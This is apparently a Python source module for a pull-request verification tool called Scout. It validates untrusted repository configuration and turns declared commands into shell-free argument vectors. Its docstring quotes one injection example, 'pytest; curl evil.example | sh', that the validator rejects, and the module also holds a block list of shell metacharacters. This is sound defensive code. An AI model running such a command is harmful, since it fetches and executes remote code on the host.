"""Repository-supplied configuration: ``.scout/engineering.yaml`` (spec section 14).

**This is untrusted input.** The file is read from the pull-request author's repository
and therefore may be written by anyone who can open a PR. Two consequences shape this
module:

1. It is parsed into a strictly validated Pydantic schema with ``extra="forbid"``. A
   typo produces a clear finding rather than a silent fallback (spec section 14
   requires exactly that).
2. Commands declared here are **never** passed to a shell. A :class:`CommandSpec`
   rejects shell metacharacters and is executed as a resolved argument vector, so a
   malicious ``commands.test: "pytest; curl evil.example | sh"`` is rejected at parse
   time instead of running on the Scout host.
"""

from __future__ import annotations

import shlex
from typing import Annotated, Any

import yaml
from pydantic import BeforeValidator, Field, ValidationError, field_validator, model_validator

from scout_domain.enums import RiskLevel, SandboxBackendKind
from scout_domain.errors import RepositoryConfigurationError
from scout_domain.models.base import ScoutModel
from scout_domain.models.sandbox import NetworkMode

__all__ = [
    "CONFIG_PATH",
    "CommandSpec",
    "CommandsConfig",
    "FeatureVerificationConfig",
    "KnowledgeConfig",
    "NotificationsConfig",
    "ProjectConfig",
    "ScoutRepositoryConfig",
    "SecurityConfig",
    "VerificationConfig",
    "parse_repository_config",
]

#: Where a repository may declare its Scout configuration (spec section 14).
CONFIG_PATH = ".scout/engineering.yaml"

#: Characters and sequences that only make sense to a shell. Their presence means the
#: author expects a shell, which is precisely what Scout will not provide.
_SHELL_METACHARACTERS: tuple[str, ...] = (
    ";",
    "|",
    "&",
    ">",
    "<",
    "`",
    "$(",
    "${",
    "\n",
    "\r",
    "\\\n",
    "&&",
    "||",
    "*",
    "?",
    "~",
)


def _upper(value: object) -> object:
    """Normalise a case-insensitive enumeration value.

    Spec section 14's own example writes ``default_risk: medium`` in lower case, so Scout
    must accept it. Normalising here rather than loosening the enum keeps the stored value
    canonical and comparable.
    """
    return value.strip().upper() if isinstance(value, str) else value


#: An enumeration field that tolerates any casing in YAML.
CaseInsensitiveStr = Annotated[str, BeforeValidator(_upper)]


class CommandSpec(ScoutModel):
    """A repository-declared command, reduced to a safe argument vector.

    Example: ``"pytest -q --maxfail=1"`` becomes
    ``argv=["pytest", "-q", "--maxfail=1"]`` and is executed without a shell.
    """

    raw: str = Field(min_length=1, max_length=2000)
    argv: list[str] = Field(default_factory=list)

    @model_validator(mode="before")
    @classmethod
    def _accept_plain_string(cls, value: object) -> object:
        """Accept ``test: "pytest -q"`` as well as an explicit mapping.

        Spec section 14's own example declares commands as bare strings, so refusing them
        would reject the documented format. Coercing here (rather than loosening the field
        type) keeps the surrounding schema strict.
        """
        if isinstance(value, str):
            return {"raw": value}
        return value

    @model_validator(mode="after")
    def _tokenize_safely(self) -> CommandSpec:
        if not self.argv:
            found = [token for token in _SHELL_METACHARACTERS if token in self.raw]
            if found:
                raise ValueError(
                    "command contains shell metacharacter(s) "
                    f"{', '.join(repr(token) for token in found)}; Scout executes commands "
                    "without a shell, so declare a plain argument list"
                )
            try:
                tokens = shlex.split(self.raw)
            except ValueError as exc:
                raise ValueError(f"command is not parseable: {exc}") from exc
            if not tokens:
                raise ValueError("command is empty after tokenization")
            object.__setattr__(self, "argv", tokens)
        return self

    def __str__(self) -> str:
        return self.raw


class ProjectConfig(ScoutModel):
    name: str = Field(min_length=1, max_length=200)
    description: str = Field(default="", max_length=2000)


class CommandsConfig(ScoutModel):
    """Declared engineering commands. All optional; Scout detects what it can."""

    install: CommandSpec | None = None
    test: CommandSpec | None = None
    lint: CommandSpec | None = None
    format: CommandSpec | None = None
    typecheck: CommandSpec | None = None
    build: CommandSpec | None = None
    #: Named extra commands, e.g. ``migration-check: "alembic check"``.
    custom: dict[str, CommandSpec] = Field(default_factory=dict)

    @model_validator(mode="after")
    def _validate_names(self) -> CommandsConfig:
        bad = [name for name in self.custom if not name.replace("_", "").replace("-", "").isalnum()]
        if bad:
            raise ValueError(f"custom command names must be alphanumeric: {bad}")
        return self


class VerificationConfig(ScoutModel):
    """How deep Scout should verify this repository by default."""

    #: Risk level applied when no risk signal matches a change (spec section 41).
    #: Note: a matched rule decides the level; this is the fallback, not a floor.
    default_risk: Annotated[RiskLevel, BeforeValidator(_upper)] = RiskLevel.MEDIUM
    #: Stages that must always run regardless of risk classification.
    required_stages: list[str] = Field(default_factory=list)
    #: Stages this repository opts out of. Opting out is recorded as a skip.
    disabled_stages: list[str] = Field(default_factory=list)
    #: A job exceeding this is failed rather than left running.
    max_duration_seconds: int = Field(default=1800, ge=60, le=21_600)
    #: When true, a change with no test coverage is reported as a finding.
    require_tests_for_code_changes: bool = True
    #: Paths whose changes never require verification (docs, licence files).
    low_risk_paths: list[str] = Field(default_factory=list)


class SecurityConfig(ScoutModel):
    enabled: bool = True
    #: Explicit tool allowlist. Empty means "use every applicable detected tool".
    tools: list[str] = Field(default_factory=list)
    #: Paths excluded from secret and static scanning (fixtures, vendored code).
    ignore_paths: list[str] = Field(default_factory=list)
    #: Findings below this severity are recorded but do not affect the recommendation.
    report_threshold: CaseInsensitiveStr = Field(
        default="LOW", pattern=r"^(INFO|LOW|MEDIUM|HIGH|CRITICAL)$"
    )
    #: When true, a CRITICAL security finding blocks the recommendation outright.
    fail_on_critical: bool = True


class FeatureVerificationConfig(ScoutModel):
    """Feature verification settings (spec sections 23-25)."""

    enabled: bool = True
    #: Explicit acceptance criteria. When empty, Scout extracts them from the PR
    #: description, linked issues, and existing tests.
    acceptance_criteria: list[str] = Field(default_factory=list)
    #: Where to look for requirements, in priority order.
    sources: list[str] = Field(
        default_factory=lambda: [
            "pull_request_body",
            "linked_issue",
            "commit_messages",
            "existing_tests",
        ]
    )
    #: Whether Scout may generate temporary verification tests. They are never
    #: committed and never touch the developer's branch (spec section 22).
    allow_generated_tests: bool = True


class KnowledgeConfig(ScoutModel):
    """Where to find engineering memory inside the repository (spec section 29)."""

    adr_paths: list[str] = Field(default_factory=lambda: ["docs/adr", "docs/adrs", "doc/adr"])
    documentation_paths: list[str] = Field(default_factory=lambda: ["docs"])
    #: Whether repository docs are ingested as knowledge documents.
    ingest_documentation: bool = True


class NotificationsConfig(ScoutModel):
    """Per-repository notification overrides (spec section 47)."""

    #: Minimum severity that triggers a notification for this repository.
    min_severity: CaseInsensitiveStr = Field(
        default="MEDIUM", pattern=r"^(INFO|LOW|MEDIUM|HIGH|CRITICAL)$"
    )
    #: Extra recipients for this repository only.
    email_recipients: list[str] = Field(default_factory=list)
    #: When true, only questions and failures notify, not successful completions.
    quiet_on_success: bool = False


class SandboxOverrideConfig(ScoutModel):
    """Requested sandbox settings. Scout clamps these to its own hard ceilings.

    A repository may ask for *less* than the platform default; it can never raise the
    limits above what the operator configured (spec section 52).
    """

    memory_mb: int | None = Field(default=None, ge=128, le=65_536)
    cpus: float | None = Field(default=None, gt=0.0, le=64.0)
    command_timeout_seconds: int | None = Field(default=None, ge=1, le=86_400)
    network_mode: Annotated[NetworkMode, BeforeValidator(_upper)] | None = None
    backend: Annotated[SandboxBackendKind, BeforeValidator(_upper)] | None = None


class ScoutRepositoryConfig(ScoutModel):
    """The complete validated configuration for one repository.

    Unknown keys are rejected. A repository that misspells ``frameworks`` as
    ``framwork`` learns about it from a finding on the very next pull request instead
    of silently running with defaults.
    """

    version: int = Field(default=1, ge=1, le=1)
    project: ProjectConfig

    languages: list[str] = Field(default_factory=list)
    frameworks: list[str] = Field(default_factory=list)
    package_managers: list[str] = Field(default_factory=list)
    databases: list[str] = Field(default_factory=list)

    commands: CommandsConfig = Field(default_factory=CommandsConfig)
    verification: VerificationConfig = Field(default_factory=VerificationConfig)
    security: SecurityConfig = Field(default_factory=SecurityConfig)
    feature_verification: FeatureVerificationConfig = Field(
        default_factory=FeatureVerificationConfig
    )
    knowledge: KnowledgeConfig = Field(default_factory=KnowledgeConfig)
    notifications: NotificationsConfig = Field(default_factory=NotificationsConfig)
    sandbox: SandboxOverrideConfig = Field(default_factory=SandboxOverrideConfig)

    @field_validator("languages", "frameworks", "package_managers", "databases")
    @classmethod
    def _normalise_names(cls, value: list[str]) -> list[str]:
        """Lower-case and de-duplicate while preserving declaration order."""
        seen: dict[str, None] = {}
        for item in value:
            cleaned = item.strip().lower()
            if not cleaned:
                raise ValueError("entries must be non-empty")
            seen.setdefault(cleaned, None)
        return list(seen)

    @model_validator(mode="after")
    def _validate_stage_overrides(self) -> ScoutRepositoryConfig:
        overlap = set(self.verification.required_stages) & set(self.verification.disabled_stages)
        if overlap:
            raise ValueError(f"stages cannot be both required and disabled: {sorted(overlap)}")
        return self


_DEFAULTS_EXAMPLE = """\
project:
  name: example-service

languages:
  - python
  - typescript

frameworks:
  - fastapi
  - react

commands:
  test: "pytest"
  lint: "ruff check ."
  typecheck: "mypy ."

verification:
  default_risk: medium

security:
  enabled: true

feature_verification:
  enabled: true
"""


def parse_repository_config(raw: str | bytes | dict[str, Any] | None) -> ScoutRepositoryConfig:
    """Parse and validate repository configuration.

    Args:
        raw: YAML text, raw bytes, an already-decoded mapping, or ``None`` when the
            repository declares no configuration.

    Returns:
        A validated configuration. When ``raw`` is ``None`` the repository gets an
        explicit, documented fallback so that Scout can still verify it — but note that
        a *malformed* file never silently falls back.

    Raises:
        RepositoryConfigurationError: with per-field detail, so the caller can emit a
            precise finding (spec section 14).
    """
    if raw is None:
        return ScoutRepositoryConfig(project=ProjectConfig(name="unknown"))

    if isinstance(raw, dict):
        data: Any = raw
    else:
        text = raw.decode("utf-8") if isinstance(raw, bytes) else raw
        if not text.strip():
            return ScoutRepositoryConfig(project=ProjectConfig(name="unknown"))
        try:
            data = yaml.safe_load(text)
        except yaml.YAMLError as exc:
            raise RepositoryConfigurationError(
                f"{CONFIG_PATH} is not valid YAML: {exc}",
                path=CONFIG_PATH,
            ) from exc

    if data is None:
        return ScoutRepositoryConfig(project=ProjectConfig(name="unknown"))
    if not isinstance(data, dict):
        raise RepositoryConfigurationError(
            f"{CONFIG_PATH} must contain a YAML mapping at the top level, "
            f"got {type(data).__name__}",
            path=CONFIG_PATH,
        )

    # A repository with no `project.name` is still configurable; default it rather than
    # failing the whole job over a cosmetic omission.
    if "project" not in data:
        data = {**data, "project": {"name": data.get("name") or "unknown"}}

    try:
        return ScoutRepositoryConfig.model_validate(data)
    except ValidationError as exc:
        detail = "; ".join(
            f"{'.'.join(str(part) for part in error['loc']) or '<root>'}: {error['msg']}"
            for error in exc.errors()
        )
        raise RepositoryConfigurationError(
            f"{CONFIG_PATH} failed validation: {detail}",
            path=CONFIG_PATH,
            error_count=len(exc.errors()),
        ) from exc


def default_config_document() -> str:
    """Return an example configuration, used by docs and by the init script."""
    return _DEFAULTS_EXAMPLE
